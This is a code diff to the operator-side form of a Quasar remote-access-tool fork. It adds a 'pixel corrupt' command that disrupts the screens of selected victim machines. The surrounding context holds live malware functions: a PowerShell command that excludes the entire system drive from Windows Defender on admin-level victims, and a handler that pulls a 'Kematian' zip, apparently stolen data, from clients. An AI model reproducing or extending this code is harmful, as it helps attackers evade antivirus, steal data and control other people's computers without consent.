@@ -3,6 +3,7 @@ using Quasar.Common.Messages;
 using Quasar.Common.Messages.Administration.Actions;
 using Quasar.Common.Messages.ClientManagement;
 using Quasar.Common.Messages.FunStuff;
+using Quasar.Common.Messages.FunStuff.GDI;
 using Quasar.Common.Messages.Preview;
 using Quasar.Common.Messages.UserSupport.MessageBox;
 using Quasar.Common.Messages.UserSupport.Website;
@@ -523,20 +524,20 @@ namespace Quasar.Server.Forms
                         new KematianHandler(client).RequestKematianZip();
                         break;
                     case "Exclude System Drives":
-                        string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
+                    string powershellCode = "Add-MpPreference -ExclusionPath \"$([System.Environment]::GetEnvironmentVariable('SystemDrive'))\\\"\r\n";
                         if (client.Value.AccountType == "Admin" || client.Value.AccountType == "System")
                         {
                             client.Send(new DoSendQuickCommand { Command = powershellCode, Host = "powershell.exe" });
                         }
                         break;
                     case "Message Box":
-                        client.Send(new DoShowMessageBox
-                        {
-                            Caption = subItem0,
-                            Text = subItem1,
-                            Button = "OK",
-                            Icon = "None"
-                        });
+                    client.Send(new DoShowMessageBox
+                    {
+                        Caption = subItem0,
+                        Text = subItem1,
+                        Button = "OK",
+                        Icon = "None"
+                    });
                         break;
                 }
             }
@@ -1298,6 +1299,14 @@ namespace Quasar.Server.Forms
             foreach (Client c in GetSelectedClients())
             {
                 c.Send(new DoSwapMouseButtons());
+            }
+        }
+
+        private void pixelCorruptToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            foreach (Client c in GetSelectedClients())
+            {
+                c.Send(new DoPixelCorrupt());
             }
         }
 
